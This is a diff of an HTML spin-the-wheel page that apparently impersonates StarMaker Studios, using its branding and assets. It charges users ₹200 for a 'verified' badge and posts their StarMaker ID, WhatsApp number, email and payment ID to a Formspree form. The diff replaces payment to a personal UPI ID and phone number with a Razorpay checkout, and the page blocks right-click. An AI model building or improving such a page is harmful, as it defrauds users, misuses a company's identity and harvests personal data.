@@ -8,6 +8,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
     <style>
         * {
             margin: 0;
@@ -255,7 +256,7 @@
             50% { transform: translateX(-50%) translateY(-10px); }
         }
 
-        .result-modal {
+        .result-modal, .contact-modal {
             position: fixed;
             top: 0;
             left: 0;
@@ -270,27 +271,30 @@
             opacity: 0;
             visibility: hidden;
             transition: all 0.4s ease;
+            overflow-y: auto;
+            padding: 20px;
         }
 
-        .result-modal.active {
+        .result-modal.active, .contact-modal.active {
             opacity: 1;
             visibility: visible;
         }
 
-        .result-content {
+        .result-content, .contact-content {
             background: #ffffff;
             border-radius: 30px;
             padding: 50px 40px;
             text-align: center;
             max-width: 500px;
-            width: 90%;
-            border: none;
+            width: 100%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
             transform: scale(0.8);
             transition: transform 0.4s ease;
+            margin: auto;
         }
 
-        .result-modal.active .result-content {
+        .result-modal.active .result-content,
+        .contact-modal.active .contact-content {
             transform: scale(1);
         }
 
@@ -313,7 +317,6 @@
             font-weight: 700;
             margin-bottom: 15px;
             color: #333;
-            text-shadow: none;
             text-transform: uppercase;
             letter-spacing: 2px;
         }
@@ -337,7 +340,7 @@
             border: 2px solid #ff296f;
         }
 
-        .claim-button {
+        .claim-button, .submit-button {
             padding: 15px 50px;
             background: #ff296f;
             color: #fff;
@@ -352,9 +355,11 @@
             box-shadow: 0 5px 20px rgba(255, 41, 111, 0.3);
             position: relative;
             overflow: hidden;
+            width: 100%;
+            margin-top: 10px;
         }
 
-        .claim-button::before {
+        .claim-button::before, .submit-button::before {
             content: '';
             position: absolute;
             top: 50%;
@@ -367,17 +372,17 @@
             transition: width 0.6s, height 0.6s;
         }
 
-        .claim-button:hover::before {
-            width: 300px;
-            height: 300px;
+        .claim-button:hover::before, .submit-button:hover::before {
+            width: 400px;
+            height: 400px;
         }
 
-        .claim-button:hover {
+        .claim-button:hover, .submit-button:hover {
             transform: translateY(-3px);
             box-shadow: 0 8px 25px rgba(255, 41, 111, 0.5);
         }
 
-        .claim-button span {
+        .claim-button span, .submit-button span {
             position: relative;
             z-index: 1;
         }
@@ -398,47 +403,6 @@
             }
         }
 
-        .contact-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2500;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.4s ease;
-            overflow-y: auto;
-            padding: 20px;
-        }
-
-        .contact-modal.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .contact-content {
-            background: #ffffff;
-            border-radius: 30px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            border: none;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            transform: scale(0.8);
-            transition: transform 0.4s ease;
-            margin: auto;
-        }
-
-        .contact-modal.active .contact-content {
-            transform: scale(1);
-        }
-
         .contact-header {
             text-align: center;
             margin-bottom: 30px;
@@ -447,9 +411,7 @@
         .contact-header h2 {
             font-size: clamp(24px, 5vw, 32px);
             color: #333;
-            text-shadow: none;
             margin-bottom: 10px;
-            text-transform: capitalize;
             letter-spacing: 1px;
             font-weight: 700;
             position: relative;
@@ -520,155 +482,10 @@
             color: #999;
         }
 
-        .submit-button {
-            width: 100%;
-            padding: 15px;
-            background: #ff296f;
-            color: #fff;
-            border: none;
-            border-radius: 25px;
-            font-size: clamp(16px, 3vw, 18px);
-            font-weight: 600;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(255, 41, 111, 0.3);
-            position: relative;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-
-        .submit-button::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .submit-button:hover::before {
-            width: 400px;
-            height: 400px;
-        }
-
-        .submit-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(255, 41, 111, 0.5);
-        }
-
-        .submit-button span {
-            position: relative;
-            z-index: 1;
-        }
-
-        .payment-methods {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-
-        .payment-method-btn {
-            width: 100%;
-            padding: 18px;
-            background: #f5f5f5;
-            color: #333;
-            border: 2px solid #e0e0e0;
-            border-radius: 25px;
-            font-size: clamp(14px, 2.5vw, 16px);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .payment-method-btn:hover {
-            background: #fff;
-            border-color: #ff296f;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 41, 111, 0.2);
-        }
-
-        .payment-instructions {
-            background: #f9f9f9;
-            padding: 25px;
-            border-radius: 20px;
-            margin-top: 20px;
-        }
-
-        .payment-instructions h3 {
-            font-size: clamp(18px, 3vw, 22px);
-            color: #333;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .upi-details {
-            background: #fff;
-            padding: 20px;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            border: 2px solid #ff296f;
-        }
-
-        .upi-details p {
-            font-size: clamp(14px, 2.5vw, 16px);
-            color: #333;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .upi-details strong {
-            color: #ff296f;
-        }
-
-        .payment-note {
-            font-size: clamp(12px, 2vw, 14px) !important;
-            color: #666 !important;
-            font-style: italic;
-            margin-top: 15px;
-        }
-
-        .back-button {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: #666;
-            border: 2px solid #e0e0e0;
-            border-radius: 25px;
-            font-size: clamp(14px, 2.5vw, 16px);
-            font-weight: 600;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-
-        .back-button:hover {
-            background: #f5f5f5;
-            border-color: #999;
-        }
-
-        .back-button span {
-            position: relative;
-            z-index: 1;
-        }
-
-        .success-icon {
+        .success-icon, .error-icon {
             width: 100px;
             height: 100px;
             margin: 0 auto 20px;
-            background: linear-gradient(135deg, #4caf50, #66bb6a);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -678,13 +495,12 @@
             animation: celebrate 0.8s ease;
         }
 
-        .success-message {
-            text-align: center;
-            color: #4caf50;
-            font-weight: bold;
-            margin-top: 15px;
-            font-size: clamp(14px, 2.5vw, 16px);
-            text-shadow: none;
+        .success-icon {
+            background: linear-gradient(135deg, #4caf50, #66bb6a);
+        }
+
+        .error-icon {
+            background: linear-gradient(135deg, #f44336, #ef5350);
         }
 
         .review-message {
@@ -700,6 +516,17 @@
             color: #333;
             text-align: center;
             line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: clamp(12px, 2vw, 14px);
+            color: #4caf50;
+            margin-top: 15px;
         }
 
         .info-section {
@@ -776,16 +603,8 @@
                 max-height: 450px;
             }
 
-            .info-section {
-                padding: 60px 5%;
-            }
-
             .result-content, .contact-content {
                 padding: 40px 30px;
-            }
-
-            .contact-modal {
-                padding: 10px;
             }
         }
 
@@ -808,7 +627,6 @@
         <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4">
     </video>
     <div class="video-overlay"></div>
-
     <div class="particles" id="particles"></div>
 
     <nav>
@@ -820,7 +638,6 @@
     <section class="hero-section">
         <h1 class="hero-title">Treasure Of V-tags</h1>
         <p class="hero-subtitle">Spin the wheel to claim your verified badge!</p>
-
         <div class="wheel-container">
             <div class="wheel-pointer"></div>
             <div class="wheel" id="wheelContainer">
@@ -866,12 +683,9 @@
     </section>
 
     <footer class="footer-section">
-        <div class="footer-copyright">
-            © 2025 StarMaker Studios. All Rights Reserved.
-        </div>
+        <div class="footer-copyright">© 2025 StarMaker Studios. All Rights Reserved.</div>
     </footer>
 
-    <!-- Result Modal -->
     <div class="result-modal" id="resultModal">
         <div class="result-content">
             <img class="result-icon" id="resultIcon" src="" alt="Badge">
@@ -882,12 +696,11 @@
         </div>
     </div>
 
-    <!-- Contact Details Modal -->
     <div class="contact-modal" id="contactModal">
         <div class="contact-content">
             <div class="contact-header">
-                <h2>Payment Required</h2>
-                <p>Complete payment to claim your badge</p>
+                <h2>Claim Your Badge</h2>
+                <p>Enter your details to proceed</p>
             </div>
             <div class="payment-info">
                 <div class="price-tag">₹200</div>
@@ -895,58 +708,28 @@
             </div>
             <form id="contactForm">
                 <div class="form-group">
-                    <input type="text" id="sid" name="sid" placeholder="StarMaker SID" required>
+                    <input type="text" id="sid" placeholder="StarMaker SID" required>
                 </div>
                 <div class="form-group">
-                    <input type="text" id="country" name="country" placeholder="Country Code (eg.: +91)" required>
+                    <input type="text" id="country" placeholder="Country Code (eg.: +91)" required>
                 </div>
                 <div class="form-group">
-                    <input type="tel" id="whatsapp" name="number" placeholder="WhatsApp Number" pattern="[0-9]{10}" required>
+                    <input type="tel" id="whatsapp" placeholder="WhatsApp Number" pattern="[0-9]{10}" required>
                 </div>
-                <button type="button" class="submit-button" id="paymentBtn"><span>PROCEED TO PAYMENT</span></button>
-                <div id="status" class="success-message"></div>
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email Address" required>
+                </div>
+                <button type="button" class="submit-button" id="paymentBtn"><span>PAY ₹200</span></button>
+                <div class="secure-badge">🔒 Secure Payment via Razorpay</div>
             </form>
         </div>
     </div>
 
-    <!-- Payment Modal -->
-    <div class="contact-modal" id="paymentModal">
-        <div class="contact-content">
-            <div class="contact-header">
-                <h2>Complete Payment</h2>
-                <p>Pay ₹200 to proceed</p>
-            </div>
-            <div class="payment-methods">
-                <button class="payment-method-btn" id="upiBtn">
-                    <span>📱 Pay with UPI</span>
-                </button>
-                <button class="payment-method-btn" id="paytmBtn">
-                    <span>💳 Pay with Paytm</span>
-                </button>
-                <button class="payment-method-btn" id="phonepeBtn">
-                    <span>💸 Pay with PhonePe</span>
-                </button>
-            </div>
-            <div class="payment-instructions" id="paymentInstructions" style="display: none;">
-                <h3>Payment Instructions</h3>
-                <div class="upi-details">
-                    <p><strong>UPI ID:</strong> 8305605153@paytm</p>
-                    <p><strong>Phone Number:</strong> 8305605153</p>
-                    <p><strong>Amount:</strong> ₹200</p>
-                    <p class="payment-note">After completing payment, click "I Have Paid" below</p>
-                </div>
-                <button class="submit-button" id="confirmPaymentBtn"><span>I HAVE PAID</span></button>
-                <button class="back-button" id="backBtn"><span>GO BACK</span></button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Success Modal -->
     <div class="contact-modal" id="successModal">
         <div class="contact-content">
             <div class="success-icon">✓</div>
             <div class="contact-header">
-                <h2>Application Submitted!</h2>
+                <h2>Payment Successful!</h2>
                 <p>Your payment has been received</p>
             </div>
             <div class="review-message">
@@ -956,79 +739,47 @@
         </div>
     </div>
 
+    <div class="contact-modal" id="failedModal">
+        <div class="contact-content">
+            <div class="error-icon">✕</div>
+            <div class="contact-header">
+                <h2>Payment Failed!</h2>
+                <p>Your payment was not successful</p>
+            </div>
+            <div class="review-message">
+                <p>The payment could not be processed. Please try again.</p>
+            </div>
+            <button class="submit-button" id="retryBtn"><span>TRY AGAIN</span></button>
+        </div>
+    </div>
+
     <script>
         document.addEventListener('contextmenu', e => e.preventDefault());
 
+        const RAZORPAY_KEY_ID = 'rzp_test_RUsoQONE9HcTpU';
+
         const vtags = [
-            {
-                name: 'Verified Singer',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_orange.webp?v=1713280307300',
-                message: 'Claim your Verified Singer badge now!',
-                color: '#ffd4e5'
-            },
-            {
-                name: 'Verified Broadcaster',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_live.webp?v=1713280993171',
-                message: 'Claim your Verified Broadcaster badge now!',
-                color: '#e6b3ff'
-            },
-            {
-                name: 'Verified Room Owner',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_room_owner_circle.webp?v=1713281002566',
-                message: 'Claim your Verified Room Owner badge now!',
-                color: '#ffccb3'
-            },
-            {
-                name: 'Talent Singer',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_person.webp?v=1713280998842',
-                message: 'Claim your Talent Singer badge now!',
-                color: '#b3e6ff'
-            },
-            {
-                name: 'Verified Influencer',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_leading_influencer_circle.webp?v=1713280985990',
-                message: 'Claim your Verified Influencer badge now!',
-                color: '#d4f5d4'
-            },
-            {
-                name: 'Officially Verified',
-                icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_blue.webp?v=1713280982435',
-                message: 'Claim your Officially Verified badge now!',
-                color: '#ffffcc'
-            }
+            {name: 'Verified Singer', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_orange.webp?v=1713280307300', message: 'Claim your Verified Singer badge now!', color: '#ffd4e5'},
+            {name: 'Verified Broadcaster', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_live.webp?v=1713280993171', message: 'Claim your Verified Broadcaster badge now!', color: '#e6b3ff'},
+            {name: 'Verified Room Owner', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_room_owner_circle.webp?v=1713281002566', message: 'Claim your Verified Room Owner badge now!', color: '#ffccb3'},
+            {name: 'Talent Singer', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_person.webp?v=1713280998842', message: 'Claim your Talent Singer badge now!', color: '#b3e6ff'},
+            {name: 'Verified Influencer', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_leading_influencer_circle.webp?v=1713280985990', message: 'Claim your Verified Influencer badge now!', color: '#d4f5d4'},
+            {name: 'Officially Verified', icon: 'https://cdn.glitch.global/7f10253b-a1b5-4771-b9be-f2d825ccaa09/ic_verified_blue.webp?v=1713280982435', message: 'Claim your Officially Verified badge now!', color: '#ffffcc'}
         ];
 
         const canvas = document.getElementById('wheel');
         const ctx = canvas.getContext('2d');
         const spinBtn = document.getElementById('spinBtn');
         const resultModal = document.getElementById('resultModal');
-        const resultIcon = document.getElementById('resultIcon');
-        const resultMessage = document.getElementById('resultMessage');
-        const resultBadge = document.getElementById('resultBadge');
-        const claimBtn = document.getElementById('claimBtn');
         const contactModal = document.getElementById('contactModal');
-        const paymentModal = document.getElementById('paymentModal');
         const successModal = document.getElementById('successModal');
-        const contactForm = document.getElementById('contactForm');
-        const paymentBtn = document.getElementById('paymentBtn');
-        const upiBtn = document.getElementById('upiBtn');
-        const paytmBtn = document.getElementById('paytmBtn');
-        const phonepeBtn = document.getElementById('phonepeBtn');
-        const paymentInstructions = document.getElementById('paymentInstructions');
-        const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
-        const backBtn = document.getElementById('backBtn');
-        const status = document.getElementById('status');
-
-        let currentRotation = 0;
-        let isSpinning = false;
+        const failedModal = document.getElementById('failedModal');
+        let currentRotation = 0, isSpinning = false, selectedBadge = null, userDetails = {};
         const images = {};
         let imagesLoaded = 0;
-        let userDetails = {};
-        let selectedBadge = null;
 
         function resizeCanvas() {
-            const container = document.getElementById('wheelContainer');
-            const size = container.offsetWidth;
+            const size = document.getElementById('wheelContainer').offsetWidth;
             canvas.width = size;
             canvas.height = size;
             drawWheel();
@@ -1050,12 +801,10 @@
 
         function drawWheel() {
             if (!canvas.width) return;
-            
             const centerX = canvas.width / 2;
             const centerY = canvas.height / 2;
             const radius = canvas.width / 2 - 10;
-            const numSegments = vtags.length;
-            const anglePerSegment = (2 * Math.PI) / numSegments;
+            const anglePerSegment = (2 * Math.PI) / vtags.length;
 
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.save();
@@ -1087,16 +836,13 @@
                     const iconY = -iconSize / 2;
                     ctx.drawImage(images[i], iconX, iconY, iconSize, iconSize);
                 }
-
                 ctx.restore();
             });
-
             ctx.restore();
         }
 
         spinBtn.addEventListener('click', () => {
             if (isSpinning) return;
-
             isSpinning = true;
             spinBtn.classList.add('disabled');
 
@@ -1105,33 +851,25 @@
 
             const anglePerSegment = (2 * Math.PI) / vtags.length;
             const spins = 5;
-            
             const segmentCenterAngle = randomIndex * anglePerSegment + anglePerSegment / 2;
             const targetRotation = -segmentCenterAngle - Math.PI / 2;
-            
             const startRotation = currentRotation;
             const normalizedStart = startRotation % (2 * Math.PI);
             const normalizedTarget = targetRotation % (2 * Math.PI);
             
             let rotationDiff = normalizedTarget - normalizedStart;
-            if (rotationDiff > 0) {
-                rotationDiff -= 2 * Math.PI;
-            }
+            if (rotationDiff > 0) rotationDiff -= 2 * Math.PI;
             
             const totalRotation = spins * 2 * Math.PI + rotationDiff;
             const endRotation = startRotation + totalRotation;
-            
             const duration = 5000;
             const startTime = Date.now();
 
             function animate() {
                 const elapsed = Date.now() - startTime;
                 const progress = Math.min(elapsed / duration, 1);
-                
                 const easeOut = 1 - Math.pow(1 - progress, 3);
-                
                 currentRotation = startRotation + (totalRotation * easeOut);
-                
                 drawWheel();
 
                 if (progress < 1) {
@@ -1144,100 +882,110 @@
                     spinBtn.classList.remove('disabled');
                 }
             }
-
             animate();
         });
 
         function showResult(tag) {
-            resultIcon.src = tag.icon;
-            resultMessage.textContent = tag.message;
-            resultBadge.textContent = tag.name;
+            document.getElementById('resultIcon').src = tag.icon;
+            document.getElementById('resultMessage').textContent = tag.message;
+            document.getElementById('resultBadge').textContent = tag.name;
             resultModal.classList.add('active');
             createConfetti();
         }
 
-        claimBtn.addEventListener('click', () => {
+        document.getElementById('claimBtn').addEventListener('click', () => {
             resultModal.classList.remove('active');
-            setTimeout(() => {
-                contactModal.classList.add('active');
-            }, 300);
+            setTimeout(() => contactModal.classList.add('active'), 300);
         });
 
-        paymentBtn.addEventListener('click', () => {
+        document.getElementById('paymentBtn').addEventListener('click', () => {
             const sid = document.getElementById('sid').value;
             const country = document.getElementById('country').value;
             const whatsapp = document.getElementById('whatsapp').value;
+            const email = document.getElementById('email').value;
 
-            if (!sid || !country || !whatsapp) {
-                status.textContent = 'Please fill all fields!';
-                status.style.color = '#ff6b6b';
+            if (!sid || !country || !whatsapp || !email) {
+                alert('Please fill all fields!');
                 return;
             }
 
             if (!/^[0-9]{10}$/.test(whatsapp)) {
-                status.textContent = 'Please enter a valid 10-digit WhatsApp number!';
-                status.style.color = '#ff6b6b';
+                alert('Please enter a valid 10-digit WhatsApp number!');
                 return;
             }
 
-            userDetails = {
-                sid: sid,
-                country: country,
-                whatsapp: whatsapp,
-                badge: selectedBadge.name
+            userDetails = {sid, country, whatsapp, email, badge: selectedBadge.name};
+            initiateRazorpayPayment();
+        });
+
+        function initiateRazorpayPayment() {
+            const options = {
+                key: RAZORPAY_KEY_ID,
+                amount: 20000,
+                currency: 'INR',
+                name: 'StarMaker V-Tags',
+                description: 'Verification Badge - ' + selectedBadge.name,
+                image: 'https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png',
+                prefill: {
+                    email: userDetails.email,
+                    contact: userDetails.country + userDetails.whatsapp
+                },
+                theme: {color: '#ff296f'},
+                handler: function (response) {
+                    handlePaymentSuccess(response);
+                },
+                modal: {
+                    ondismiss: function() {
+                        console.log('Payment cancelled by user');
+                    }
+                }
             };
 
-            contactModal.classList.remove('active');
-            setTimeout(() => {
-                paymentModal.classList.add('active');
-            }, 300);
-        });
-
-        upiBtn.addEventListener('click', () => showPaymentInstructions('UPI'));
-        paytmBtn.addEventListener('click', () => showPaymentInstructions('Paytm'));
-        phonepeBtn.addEventListener('click', () => showPaymentInstructions('PhonePe'));
-
-        function showPaymentInstructions(method) {
-            document.querySelector('.payment-methods').style.display = 'none';
-            paymentInstructions.style.display = 'block';
+            const razorpay = new Razorpay(options);
+            razorpay.on('payment.failed', function (response) {
+                handlePaymentFailure(response);
+            });
+            razorpay.open();
         }
 
-        backBtn.addEventListener('click', () => {
-            document.querySelector('.payment-methods').style.display = 'flex';
-            paymentInstructions.style.display = 'none';
-        });
-
-        confirmPaymentBtn.addEventListener('click', () => {
+        function handlePaymentSuccess(response) {
             const formData = new FormData();
             formData.append('sid', userDetails.sid);
             formData.append('country', userDetails.country);
             formData.append('number', userDetails.whatsapp);
+            formData.append('email', userDetails.email);
             formData.append('badge', userDetails.badge);
-            formData.append('payment', '₹200 Paid');
+            formData.append('payment_id', response.razorpay_payment_id);
+            formData.append('payment_status', 'SUCCESS');
+            formData.append('amount', '₹200');
 
             fetch('https://formspree.io/f/meqynyre', {
                 method: 'POST',
                 body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).then(response => {
-                if (response.ok) {
-                    paymentModal.classList.remove('active');
-                    setTimeout(() => {
-                        successModal.classList.add('active');
-                    }, 300);
-                    
+                headers: {'Accept': 'application/json'}
+            }).then(res => {
+                if (res.ok) {
+                    contactModal.classList.remove('active');
+                    setTimeout(() => successModal.classList.add('active'), 300);
                     setTimeout(() => {
                         successModal.classList.remove('active');
                         location.reload();
                     }, 5000);
-                } else {
-                    alert('Error submitting form. Please try again.');
                 }
             }).catch(error => {
-                alert('Error submitting form. Please try again.');
+                console.error('Error:', error);
+                alert('Payment successful but failed to submit details. Please contact support with Payment ID: ' + response.razorpay_payment_id);
             });
+        }
+
+        function handlePaymentFailure(response) {
+            contactModal.classList.remove('active');
+            setTimeout(() => failedModal.classList.add('active'), 300);
+        }
+
+        document.getElementById('retryBtn').addEventListener('click', () => {
+            failedModal.classList.remove('active');
+            setTimeout(() => contactModal.classList.add('active'), 300);
         });
 
         function createConfetti() {
@@ -1276,17 +1024,12 @@
                 const rotateY = (centerX - x) / 20;
                 card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-10px)`;
             });
-            
             card.addEventListener('mouseleave', () => {
                 card.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) translateY(0)';
             });
         });
 
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-
+        const observerOptions = {threshold: 0.1, rootMargin: '0px 0px -50px 0px'};
         const observer = new IntersectionObserver((entries) => {
             entries.forEach(entry => {
                 if (entry.isIntersecting) {
